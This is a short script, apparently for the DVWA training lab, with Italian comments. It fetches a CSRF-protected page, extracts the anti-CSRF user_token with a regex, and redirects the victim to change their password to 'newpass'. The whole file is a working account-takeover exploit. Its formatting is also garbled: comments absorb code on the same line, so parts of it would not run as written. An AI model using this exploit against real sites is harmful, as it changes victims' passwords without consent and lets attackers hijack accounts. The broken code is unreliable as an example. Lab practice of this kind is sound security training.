<?php

// Definisco l'URL che intendo violare var csrf_url = 'http://victim/vuln/vulnerabilities/csrf/';
// Creo un "contenitore" in cui effettuerò la connessione

xmlhttp = new XMLHttpRequest();
xmlhttp . onreadystatechange =
function ()
{

	// Se la connessione ha avuto successo

	if (xmlhttp . readyState == 4 && xmlhttp . status == 200) {

		// In text salvo i risultati della pagina         var text = xmlhttp.responseText;         // Definisco la regex per cercare user_token

		var regex = / user_token' value\=\'(.*?)\' \/\>/;

        // In match carico i risultati (come array)

        var match = text.match(regex);

        // In token carico il primo risultato

        var token = match[1];

        // Stampo il risultato

        alert(token);

// Rinvio l'utenteallapaginadicambiopassword location . href = csrf_url + '?password_new=newpass&password_conf=newpass&Change=Change&user_token=' + token;

	}
};
  // Eseguo la connessione del "contenitore"
xmlhttp . open("GET", csrf_url, false);
xmlhttp . send();
